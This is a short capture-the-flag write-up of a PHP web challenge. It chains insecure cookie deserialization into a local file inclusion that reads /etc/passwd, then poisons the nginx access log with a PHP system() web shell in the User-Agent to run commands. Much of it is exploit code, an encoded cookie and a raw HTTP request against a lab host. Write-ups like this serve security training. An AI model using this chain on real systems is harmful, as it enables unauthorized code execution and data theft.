1. After we analyzed the source code, we discovered something interesting.
   - The flag file existed in `/` directory and was renamed something like `flag_XXXXX`; `XXXXXX` was random.
   - `index.php` serialized `PageModel` class and put it inside the client's cookie `PHPSESSID`.
   - `PageModel` would read the `$file`.
   - `index.php` unserialized the client's cookie to read the file.

2. We then tested whether we could read any file in the system by changing `PHPSESSID`, and it succeeded.

```php
<?php

class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}

$page = new PageModel;
$page->file = '../etc/passwd';

echo base64_encode(serialize($page));
```

3. Since we cannot know the flag's filename, and thus we need something to execute `ls /`. To do this, we used `/var/log/nginx/access.log` that was described in the `nginx.conf`, and we then changed our `Agent` to `<?php system($_GET['cmd']) ?>` to access the webserver.

4. Finally, we changed the `PHPSESSID` pointing to `/log/nginx/access.log`, and provided the parameter `cmd=ls+/`.

```php
<?php

class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}

$page = new PageModel;
$page->file = '/var/log/nginx/access.log';

echo base64_encode(serialize($page));
```

```
GET http://138.68.167.82:31905/index.php?cmd=ls+/ HTTP/1.1
Host: 138.68.167.82:31905
User-Agent: system($_GET["cmd"])
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Length: 0
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
```